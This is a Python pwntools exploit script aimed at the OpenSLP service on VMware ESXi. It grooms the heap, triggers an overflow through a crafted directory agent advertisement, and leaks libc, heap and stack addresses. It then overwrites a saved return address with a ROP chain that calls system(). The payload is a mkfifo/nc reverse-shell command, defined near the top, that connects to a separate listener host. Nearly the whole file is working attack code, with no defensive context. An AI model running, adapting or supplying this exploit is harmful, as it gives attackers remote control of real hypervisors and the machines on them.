#!/usr/bin/env python3
from pwn import *

from time import *

context.endian = 'big'

HOST = '192.168.8.192'

PORT = 427

LOG = False

shell = b'rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.8.129 80 > /tmp/f' # reverse shell

# diffrent request funcid
SLP_FUNCT_SRVRQST = 1
SLP_FUNCT_SRVREG = 3
SLP_FUNCT_ATTRRQST = 6
SLP_FUNCT_DAADVERT = 8

# SLPDSocket states
STREAM_READ = 0x6c
STREAM_READ_FIRST = 0x6d
STREAM_WRITE_FIRST = 0x6f
STREAM_LISTEN = 0x65

# used to mark our position in the leak

MARKER = b'\x3f\xb3\x4d\xd3' #b'\xde\xc0\xad\xba'

class SLP:
	def __init__(self):
		self.io = 0 # initial value
	
	def connect(self):
		self.io = remote(HOST, PORT)
		
	'''
		generate SLPHeader
	'''
	def slp_header(self, msg, funcid, flags, extoffset, xid):
		length = len(msg) + 0x10 # msg length plus header length
		header = p8(2) + p8(funcid) +\
			p32(length)[1:] + p16(flags) +\
			p32(extoffset)[1:] + p16(xid) + p16(0x2) + b'!!'
			
		return header

	'''
		generate service request packet
	'''
	def srvreq_generate(self, spi):
		prlist = srvtype = scopelist = predictate = b''
		body = p16(len(prlist)) + prlist +\
			p16(len(srvtype)) + srvtype +\
			p16(len(scopelist)) + scopelist +\
			p16(len(predictate)) + predictate +\
			p16(len(spi)) + spi

		return self.slp_header(body, SLP_FUNCT_SRVRQST, 0, 0, 5) + body

	'''
		send a service request
	'''
	def srvreq(self, spi):
		self.send(self.srvreq_generate(spi))
		#data = self.recv(1024)

	def url_entry_generate(self, url):
		url_entry = p8(0x0) + p16(2*60) +\
			p16(len(url)) + url +\
			p8(0x0) + b''
		return url_entry

	def srvreg_generate(self, url, srvtype, scopelist, attrlist):
		body = self.url_entry_generate(url) +\
			p16(len(srvtype)) + srvtype +\
			p16(len(scopelist)) + scopelist +\
			p16(len(attrlist)) + attrlist +\
			p8(0x0)
		return self.slp_header(body, SLP_FUNCT_SRVREG, 0, 0, 20) + body

	def srvreg(self, url, srvtype, scopelist, attrlist):
		self.send(self.srvreg_generate(url, srvtype, scopelist, attrlist))
		#data = io.recv(1024)
	'''
		generate a directory agent advertisement packet
	'''
	def daavert_generate(self, url, scopelist):
		errorcode = 0
		bootstamp = 0
		authcount = 0
		attrlist = spi = b''
		body = p16(errorcode) + p32(bootstamp) +\
			p16(len(url)) + url +\
			p16(len(scopelist)) + scopelist +\
			p16(len(attrlist)) + attrlist +\
			p16(len(spi)) + spi +\
			p8(authcount)
		return self.slp_header(body, SLP_FUNCT_DAADVERT, 0, 0, 0) + body # xid = 0 so we reach the vulnerable path !!
			
	
	'''
		send a directory agent advertisement request
	'''
	def daavert(self, url, scopelist=b''):
		self.send(self.daavert_generate(url, scopelist))



	'''
		generate an attribute request
	'''
	def attribreq_generate(self, url, scopelist):
		prlist = taglist = spistr = b''
		body = p16(len(prlist)) + prlist +\
			p16(len(url)) + url +\
			p16(len(scopelist)) + scopelist +\
			p16(len(taglist)) + taglist +\
			p16(len(spistr)) + spistr
		
		return self.slp_header(body, SLP_FUNCT_ATTRRQST, 0, 0, 0) + body

	'''
		send an attribute request
	'''
	def attribreq(self, url, scopelist):
		self.send(self.attribreq_generate(url, scopelist))

	'''
		trigger the heap overflow
		@size : overwrite adjacent chunk's size field with @size
	'''
	
	def overflow(self, size):
		url = b'Z'*24 # cause calloc to allocate a 0x40 chunk
		scopelist = b'Y'*13 + p16(size, endian='little') + b':/' + b'C'*0x0101
		self.daavert(url, scopelist)
	
	
	
	def partial_slp_sendbuf_update(self, size):
		sendbuf = flat([
			0x598,
			0,0,
			0x578
		], endianness='little') + b'\x00\x00'
		
		filler = b'F'*(size - len(sendbuf) - 0x38 - 0x4)
		self.srvreq(filler + sendbuf)

	'''
		update a slpdsocket state
	'''
	def slp_socket_state_update(self, size, fd, state):
		slpsocket = flat([
			0xd1,
			0,0,
			0xcafebabe,
			fd,
			0,
			state
			], endianness='little')
		filler = (size - len(slpsocket) - 0x38 - 0x2) * b'F'	
		
		self.srvreq(filler + slpsocket) # i hope this works
	
	
	def slp_recvbuf_update(self, size, addr, dataLen):
		recvbuf = flat([
			0x81,
			0,0,
			dataLen+0x1a,
			addr-0x1a,
			addr-0x1a,
			addr+dataLen
		], endianness='little')
		
		filler = (size - len(recvbuf) - 0x38 - 0x2) * b'A'
		self.srvreq(filler + recvbuf)
	
	def slp_sendbuf_update(self, size, addr, dataLen):
		sendbuf = flat([
				0x599,
				0,0,
				dataLen,
				addr,
				addr,
			    	addr + dataLen
			], endianness='little')

		filler = (size - len(sendbuf) - 0x38 - 0x2) * b'A'
		
		self.srvreq(filler + sendbuf)
	
	'''
		Ugly way to parse the leak but it works sometimes 50 % :<
	'''
	def leak(self):
		global heap
		global libc

		leak = b''

		
		if self.recv(4) == b'':
			log.warn('no leak leak for ya !')
			exit(0)
	
		while True:
			sleep(0.003)
			data = self.recv(4)
				
			#print(f'leaked {data.decode()}')
			
			if MARKER in data:
				log.info('MARKER in LEAK hmmmmm ....')
				leak = self.recvall()
				break
			elif data == '':
				log.warn('no leak for ya !')
				exit(0)
			else:
				continue						
		
		parsed_leak = [u32(leak[i*4 : (i+1)*4], endian='little') for i in range(len(leak) // 4)] + [u32(leak[(len(leak) // 4) * 4 : ] + b'\x00' * (4 - (len(leak) %  4)), endian='little')] # thanks chatGPT for this snippet
		
		libc = parsed_leak[2] - 0x193450
		heap = parsed_leak[42] - 0x5b6e

		
	'''
		allocate a @size chunk (used mainly for defragmentation)
	'''	
	def groom(self, size):
		if size > 0x38:
			size -= 0x38
		else:
			size = 0x0

		self.srvreq(b'C'*size)	
	
	'''
		recv n bytes
	'''
	def recv(self, n):
		return self.io.recv(n, timeout=0.5)
	
	'''
		recvuntil delemiter
	'''
	def recvuntil(self, deli):
		return self.io.recvuntil(deli, drop=True)

	def recvall(self):
		all_data = b''
		self.io.sock.settimeout(2)

		while True:
			chunk = self.recv(4096)
			if not chunk:
				break
			all_data += chunk
		return all_data

	def send(self, data):
		return self.io.send(data)

	def close(self):
		return self.io.close()

	'''
		grab vmware esxi version (pwn friendly)
	'''
	def version(self):
		self.attribreq(b'service:VMwareInfrastructure', b'default')
		self.recvuntil(b'(product="')
		version = self.recvuntil(b'")').decode()
		self.recv(1024) # recv the rest of the response
		return version
		

# initialize all SLP client instances

pwned = []

for i in range(60):
	pwned.append(SLP())	


# defragment the heap
pwned[0].connect() # used to grab the version   0

#pause()
pwned[1].connect() # 1

#pause()
pwned[2].connect() # 2
pwned[3].connect() # 0xa
pwned[4].connect() # 0xb
pwned[5].connect() # 0xc

# grab OpenSLP version (pwn friendly)
log.success(f'version @ {pwned[0].version()}')



# deframent the heap

pwned[5].groom(0x40)
pwned[1].groom(0x40)
pwned[2].groom(0x40)
pwned[4].groom(0x40)



# grab leak


'''
	allocation occurs during overflow()
	
	slpsocket -> 0xd0
	recvbuf -> 0x168
	sendbuf -> 0x598
	duprecvbuf -> 0x168
	slpmessage -> 0xf0
	url -> 0x40
	
	allocation occurs during groom()
	
	slpsocket -> 0xd0
	recvbuffer -> DYNAMIC
	sendbuffer -> 0x598
	slpmessage -> 0xf0  (freed after the response sent)
'''

pwned[6].connect() # used for groooming 

pwned[6].groom(0x168*2 + 0xe0 + 0x80 + 0xd0) 

pwned[7].connect() # we will overlap this one 0xe

pwned[8].connect() # 0xf

#log.info('creating a hole in heap')

pwned[6].close() # create a hole

pwned[9].connect() # 0xd

#log.info('triggering the first overflow')

pwned[9].overflow(0x121) # extend free chunk 0x100 -> 0x121


fd = 0x000000e # pwned[7] FD

pwned[8].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN) # now pwned[8] recvbuf overlaps pwned[7] slpdsocket

pwned[10].connect() # 0x11

pwned[10].groom(0x400) # fill hole left by DAAVERT req



'''
	heap layout :

	[	pwned[8]->recvbuf	] 0x140
		.....					---> pwned[7]->slpdsocket (left over)
	[	pwned[8]->slpdsocket	] 0xd1
	[	pwned[10]->senbuf	] 0x598
'''

# overlap pwned[7] sendbuf and partial overwrite sendbuf->start 2 lsb with \x00\x00

pwned[11].connect() 
pwned[13].connect()
pwned[12].connect() 

pwned[12].groom(0x998-0x40-0x518 - 0x90 + 0xd0) # 0x00000a99

pwned[8].slp_socket_state_update(0x120, fd, STREAM_READ_FIRST)

pwned[7].groom(0x80)

pwned[8].slp_socket_state_update(0x120, fd, STREAM_READ_FIRST)


pwned[7].groom(0x90) 
# receive averything before partially pudateing pwned[7]->sendbuf->start

pwned[8].slp_socket_state_update(0x120, fd, STREAM_WRITE_FIRST)

pwned[7].recvall()



pwned[8].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)

pwned[12].close() # this leaves a hole in heap 0xa98

pwned[14].connect() # to trigger the overflow again

pwned[14].overflow(0x11b) # 0x118 with IS_MMAPED & PREV_INUSE

log.info('partially overwrite pwned[7]->sendbuf->start pointer')

pwned[11].partial_slp_sendbuf_update(0x118)

pwned[13].srvreq(b'ZZ' + MARKER) # mark our leak 

pwned[8].slp_socket_state_update(0x120, fd, STREAM_WRITE_FIRST)

log.info('start leaking .....')

pwned[7].leak() # parse the leak if any hmmmmmm

log.success(f'heap @ 0x{heap:02x}')

log.success(f'libc @ 0x{libc:02x}')


environ = libc + 0x194e20
system = libc + 0x3e390


log.info(f'environ @ 0x{environ:02x}')
log.info(f'system @ 0x{system:02x}')

pwned[8].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)

'''
	heap layout
	
	[	pwned[7] socket		] 0xd1
	[	pwned[8] socket		] 0xd1
	[	pwned[8]->sendbuf	] 0x598
	[	pwned[10]->sendbuf	]
	[	freed chunk		] 0xa98
	[	pwned[7]->sendbuf]	] 0x598
	[	pwned[7]->recvbuf	]
'''

# fill 0x3c0 hole

pwned[15].connect()
pwned[15].groom(0x3c0) # close heap hole left by the leak phase


# arbitrary read primitve

pwned[16].connect()

pwned[16].groom(0x168*2 + 0xe0 + 0x80 + 0xd0)

pwned[17].connect() # we will overlap this one

pwned[18].connect() # we will use this to overlap pwned[17]->sock

pwned[16].close() # create a hole to occupy with daavert req

pwned[19].connect()

pwned[19].overflow(0x121) # extend 0x100 -> 0x120

fd = 0x14 # pwned[17] socket's FD

pwned[18].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)

# fill heap holes 0x4d0

pwned[20].connect()
pwned[20].groom(0x400) # fresh heap now o work with


# overlapping pwned[17]->sendbuf

pwned[21].connect() # we will use this to overlap pwned[17]->sendbuf 

pwned[22].connect()


pwned[22].groom(0x168*2 + 0xe0 + 0x80 + 0xd0 - 0x80 + 0x20 + 0x60)

pwned[18].slp_socket_state_update(0x120, fd, STREAM_READ_FIRST)

pwned[17].groom(0x38) # allocate pwned[17] in a freed 0x38 chunk so the pwned[17]->sendbufcomes at the end (to overflow)

pwned[18].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)

pwned[22].close() # hole for daavert req

pwned[23].connect()


pwned[23].overflow(0x121) # 0x100 --> 0x120

# added

pwned[18].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)

pwned[21].slp_sendbuf_update(0x120, environ, 0x8)

pwned[18].slp_socket_state_update(0x120, fd, STREAM_WRITE_FIRST)

pwned[17].recvall() # recv every thing 

# added

pwned[21].slp_sendbuf_update(0x120, environ, 0x8)
pwned[18].slp_socket_state_update(0x120, fd, STREAM_WRITE_FIRST)

stack = u32(pwned[17].recv(8)[0:4], endian='little') - 0x7fdf4

log.success(f'stack @ 0x{stack:02x}')


# fill heap hole 0x4d0

pwned[24].connect()
pwned[24].groom(0x400)

pwned[18].slp_socket_state_update(0x120, 0x8, STREAM_LISTEN)


# arbitrary write primitive

pwned[25].connect()
pwned[25].groom(0x168*2 + 0xe0 + 0x80 + 0xd0)


pwned[26].connect() # we will overlap this one
pwned[27].connect() # we will use this to overlap pwned[26]->sock
pwned[25].close() # create a hole to occupy with daavert req

# overflow

pwned[28].connect()
pwned[28].overflow(0x121) # 0x100 --> 0x121

fd = 0x19 # pwned[26] 's FD

pwned[27].slp_socket_state_update(0x120, 0x8 , STREAM_LISTEN)


# filling heap hole 0x4d0

pwned[29].connect()
pwned[29].groom(0x400)

# overlap pwned[26]->recvbuf

pwned[30].connect()

pwned[31].connect()

pwned[31].groom(0x168*2 + 0xe0 + 0x80 + 0xd0)

#pause()

pwned[27].slp_socket_state_update(0x120, fd , STREAM_READ_FIRST)

pwned[26].srvreq(b'\x11'*(0x80-0x38))

pwned[27].slp_socket_state_update(0x120, 0x8 , STREAM_LISTEN)

pwned[31].close() # create a hole

# overflow

pwned[32].connect()
pwned[32].overflow(0x121) # 0x100 --> 0x120

# write shell command at know address

pwned[30].slp_recvbuf_update(0x120, heap+0x1770, len(shell))
pwned[27].slp_socket_state_update(0x120, fd , STREAM_READ) # STATE -> STREAM_READ so the application won't tamper with our recvbuf->* pointers during SLPBufferRealloc

pwned[26].srvreq(shell) # write shell command to the heap

retn = libc + 0x100411 # ret 

rop = flat([
	retn,
	system,
	retn,
	heap+0x1770
], endianness='little')

ret = stack+0x7f8cc # IncomingStreamRead ret address on stack


log.info('EIP !? ....')

pwned[30].slp_recvbuf_update(0x120, ret, len(rop))

pwned[27].slp_socket_state_update(0x120, fd , STREAM_READ) 

pwned[26].srvreq(rop) # overwrie saved EIP with rop
